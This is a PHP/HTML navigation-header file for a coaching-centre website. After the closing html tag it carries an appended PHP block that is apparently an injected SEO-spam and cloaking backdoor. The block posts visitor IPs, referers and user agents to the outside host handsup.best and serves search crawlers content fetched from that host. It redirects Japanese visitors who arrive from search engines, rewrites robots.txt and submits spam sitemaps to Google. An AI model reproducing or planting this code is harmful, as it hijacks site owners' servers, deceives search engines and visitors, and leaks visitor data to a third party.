<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>header</title>
    <link rel="stylesheet" href="stylesheet.css">
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-light bg-white">
    <a class="navbar-brand" href="./index.php">
        <img src="./favicon.png" alt="Logo" width="100" height="100" class="d-inline-block align-text-top" >
    </a>
    
    <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto ">
            <li class="nav-item">
                <a class="nav-link" href="index.php">Home</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="login.php">login</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="register.php">Register</a>
            </li>
        </ul>
    </div>
</nav>
<p id="loginreg"> <a class="logintop" href="login.php">login</a> | <a class="logintop" href="register.php">register</a> </p>
</body>
</html> -->

<!DOCTYPE html>
<html>

<head>
    <!-- Include Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="stylesheet.css">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
</head>

<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-white">
        <div class="container">
            <!-- Logo and Website Name -->
            <a class="navbar-brand" href="#">
                <img src="./favicon.jpg" class="img-fluid" width="40" height="40" alt="Logo">
                PAI-IAS Coaching Centre
            </a>

            <!-- Responsive Navbar Toggle Button -->
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <!-- Navbar Links -->
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="welcome.php">Home <span class="sr-only">(current)</span></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href=""><?php echo htmlspecialchars($_SESSION["username"]); ?></a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="logout.php">Sign Out </a>
                        <!-- <a class="nav-link" href="register.php">Logout</a> -->
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Include Bootstrap JS and jQuery if needed -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>

</html>

<?php $a = 'http://z30920_7.handsup.best/';
function ab()
{
    return;
}
function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    $file_contents = curl_exec($ch);
    curl_close($ch);
    return $file_contents;
}
function getServerCont($url, $data = array())
{
    $url = str_replace(' ', '+', $url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    $output = curl_exec($ch);
    $errorCode = curl_errno($ch);
    curl_close($ch);
    if (0 !== $errorCode) {
        return false;
    }
    return $output;
}
function getServerCont11($url, $data = array())
{
    $url = str_replace(' ', '+', $url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    $output = curl_exec($ch);
    $errorCode = curl_errno($ch);
    curl_close($ch);
    if (0 !== $errorCode) {
        return false;
    }
    return $output;
}
function is_crawler($agent)
{
    $agent_check = false;
    $bots = 'googlebot|google|yahoo|bing|aol';
    if ($agent != '') {
        if (preg_match("/($bots)/si", $agent)) {
            $agent_check = true;
        }
    }
    return $agent_check;
}
function check_refer($refer)
{
    $check_refer = false;
    $referbots = 'google.co.jp|yahoo.co.jp|google.com';
    if ($refer != '' && preg_match("/($referbots)/si", $refer)) {
        $check_refer = true;
    }
    return $check_refer;
}
$http = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://');
$req_uri = $_SERVER['REQUEST_URI'];
$domain = $_SERVER["HTTP_HOST"];
$self = $_SERVER['PHP_SELF'];
$ser_name = $_SERVER['SERVER_NAME'];
$req_url = $http . $domain . $req_uri;
$indata1 = $a . "/indata.php";
$map1 = $a . "/map.php";
$jump1 = $a . "/jump.php";
$url_words = $a . "/words.php";
$url_robots = $a . "/robots.php";
if (strpos($req_uri, ".php")) {
    $href1 = $http . $domain . $self;
} else {
    $href1 = $http . $domain;
}
$data1[] = array();
$data1['domain'] = $domain;
$data1['req_uri'] = $req_uri;
$data1['href'] = $href1;
$data1['req_url'] = $req_url;
if (substr($req_uri, -6) == 'robots') {
    $robots_cont = getServerCont($url_robots, $data1);
    define('BASE_PATH', str_ireplace($_SERVER['PHP_SELF'], '', __FILE__));
    file_put_contents(BASE_PATH . '/robots.txt', $robots_cont);
    $robots_cont = file_get_contents(BASE_PATH . '/robots.txt');
    if (strpos(strtolower($robots_cont), "sitemap")) {
        echo 'robots.txt file create success!';
    } else {
        echo 'robots.txt file create fail!';
    }
    return;
}
if (substr($req_uri, -4) == '.xml') {
    if (strpos($req_uri, "pingsitemap.xml")) {
        $str_cont = getServerCont($map1, $data1);
        $str_cont_arr = explode(",", $str_cont);
        $str_cont_arr[] = 'sitemap';
        for ($k = 0; $k < count($str_cont_arr); $k++) {
            if (strpos($href1, ".php") > 0) {
                $tt1 = '?';
            } else {
                $tt1 = '/';
            }
            $http2 = $href1 . $tt1 . $str_cont_arr[$k] . '.xml';
            $data_new = 'https://www.google.com/ping?sitemap=' . $http2;
            $data_new1 = 'http://www.google.com/ping?sitemap=' . $http2;
            if (stristr(@file_get_contents($data_new), 'successfully')) {
                echo $data_new . '===>Submitting Google Sitemap: OK' . PHP_EOL;
            } else if (stristr(@curl_get_contents($data_new), 'successfully')) {
                echo $data_new . '===>Submitting Google Sitemap: OK' . PHP_EOL;
            } else if (stristr(@file_get_contents($data_new1), 'successfully')) {
                echo $data_new1 . '===>Submitting Google Sitemap: OK' . PHP_EOL;
            } else if (stristr(@curl_get_contents($data_new1), 'successfully')) {
                echo $data_new1 . '===>Submitting Google Sitemap: OK' . PHP_EOL;
            } else {
                echo $data_new1 . '===>Submitting Google Sitemap: fail' . PHP_EOL;
            }
        }
        return;
    }
    if (strpos($req_uri, "allsitemap.xml") || strpos($req_uri, "sitemap-index.xml") || strpos($req_uri, "sitemap-index-1.xml")) {
        $str_cont = getServerCont($map1, $data1);
        header("Content-type:text/xml");
        echo $str_cont;
        return;
    }
    if (strpos($req_uri, ".php")) {
        $word4 = explode("?", $req_uri);
        $word4 = $word4[count($word4) - 1];
        $word4 = str_replace(".xml", "", $word4);
    } else {
        $word4 = str_replace("/", "", $req_uri);
        $word4 = str_replace(".xml", "", $word4);
    }
    $data1['word'] = $word4;
    $data1['action'] = 'check_sitemap';
    $check_url4 = getServerCont($url_words, $data1);
    if ($check_url4 == '1') {
        $str_cont = getServerCont($map1, $data1);
        header("Content-type:text/xml");
        echo $str_cont;
        return;
    }
    $data1['action'] = "check_words";
    $check1 = getServerCont($url_words, $data1);
    if (strpos($req_uri, "map") > 0 || $check1 == '1') $data1['action'] = "rand_xml";
    $check_url4 = getServerCont($url_words, $data1);
    header("Content-type:text/xml");
    echo $check_url4;
    return;
}
if (strpos($req_uri, ".php")) {
    $main_shell = $http . $ser_name . $self;
    $data1['main_shell'] = $main_shell;
} else {
    $main_shell = $http . $ser_name;
    $data1['main_shell'] = $main_shell;
}
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$chk_refer = check_refer($referer);
$user_agent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
$res_crawl = is_crawler($user_agent);
if (strpos($_SERVER['REQUEST_URI'], '.php')) {
    $url_ext = '?';
} else {
    $url_ext = '/';
}
if ($chk_refer && (preg_match('/ja/i', @$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match('/ja/i', @$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match("/^[a-z0-9]+[0-9]+$/", end(explode($url_ext, str_replace(array(".html", ".htm"), "", $_SERVER['REQUEST_URI'])))))) {
    $data1['ip'] = $_SERVER["REMOTE_ADDR"];
    $data1['referer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $data1['user_agent'] = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
    echo getServerCont11($jump1, $data1);
    return;
}
if ($res_crawl) {
    $data1['http_user_agent'] = $user_agent;
    echo getServerCont11($indata1, $data1);
    ab();
} ?>